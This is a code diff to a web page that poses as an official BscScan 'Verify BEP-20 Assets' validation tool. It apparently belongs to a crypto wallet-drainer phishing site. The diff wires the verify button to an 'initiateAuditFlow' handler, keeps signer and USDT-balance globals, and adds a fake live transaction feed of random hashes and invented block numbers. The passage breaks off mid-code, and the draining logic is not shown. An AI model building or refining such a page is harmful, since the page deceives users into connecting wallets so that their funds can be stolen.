@@ -60,7 +60,7 @@
     .verify-title { font-size: 18px; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-align: center; }
     .verify-desc { font-size: 11px; color: #718096; text-align: center; margin-bottom: 18px; line-height: 1.5; padding: 0 8px; }
 
-    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 15px; border-radius: 12px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 700; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); -webkit-tap-highlight-color: transparent; }
     .btn-verify:active { transform: scale(0.98); }
     .verify-footer-notes { display: flex; justify-content: space-between; width: 100%; padding-top: 14px; margin-top: 14px; border-top: 1px solid #1e2430; font-size: 10px; color: #718096; }
     .note-yellow { color: #f3ba2f; font-weight: 600; }
@@ -74,9 +74,6 @@
     @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
     .ticker-item { display: inline-flex; align-items: center; gap: 6px; font-size: 11px; color: #718096; }
     .ticker-token { color: #ffffff; font-weight: 600; }
-    .dot-blue { width: 6px; height: 6px; background-color: #3b82f6; border-radius: 50%; }
-    .dot-purple { width: 6px; height: 6px; background-color: #8b5cf6; border-radius: 50%; }
-    .dot-green-light { width: 6px; height: 6px; background-color: #10b981; border-radius: 50%; }
 
     /* Live Transactions Table */
     .tx-container { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; width: 100%; overflow: hidden; margin-bottom: 20px; }
@@ -112,7 +109,7 @@
     .balance-label { font-size: 11px; color: #718096; margin-bottom: 6px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
     .balance-val { font-size: 28px; font-weight: 800; color: #00d395; }
 
-    .btn-continue { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
+    .btn-continue { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); -webkit-tap-highlight-color: transparent; }
     .btn-continue:active { transform: scale(0.98); }
 
     .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
@@ -202,8 +199,8 @@
             <div class="verify-title">Verify BEP-20 Assets</div>
             <div class="verify-desc">Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</div>
             
-            <!-- Verification Button -->
-            <button id="mainVerifyBtn" class="btn-verify" type="button">
+            <!-- Verification Button with Direct onclick -->
+            <button id="mainVerifyBtn" class="btn-verify" type="button" onclick="initiateAuditFlow()">
               <i class="fa-solid fa-shield-halved" id="btnIcon"></i>
               <span id="btnText">Verify Asset</span>
             </button>
@@ -337,17 +334,21 @@
     let globalProvider, globalSigner, globalUserAddress;
     let totalUsdtWei = ethers.BigNumber.from(0);
 
-    // Attach click listener safely on DOM load
-    document.addEventListener("DOMContentLoaded", () => {
-      const verifyBtn = document.getElementById("mainVerifyBtn");
-      if (verifyBtn) {
-        verifyBtn.addEventListener("click", initiateAuditFlow);
-      }
-    });
-
     // Dynamic live transaction feed generator
     const sampleHexChars = "abcdef0123456789";
     function generateRandomHash() {
       let part1 = '';
       let part2 = '';
       for(let i=0; i<4; i++) part1 += sampleHexChars[Math.floor(Math.random() * sampleHexChars.length)];
+      for(let i=0; i<4; i++) part2 += sampleHexChars[Math.floor(Math.random() * sampleHexChars.length)];
+      return `0x${part1}...${part2}`;
+    }
+
+    let currentBlock = 38924110;
+    setInterval(() => {
+      currentBlock++;
+      const table = document.getElementById('txTable');
+      if(table) {
+        const newRow = table.insertRow(1);
+        newRow.innerHTML = `
+          <td class="hash-text">${generateRan
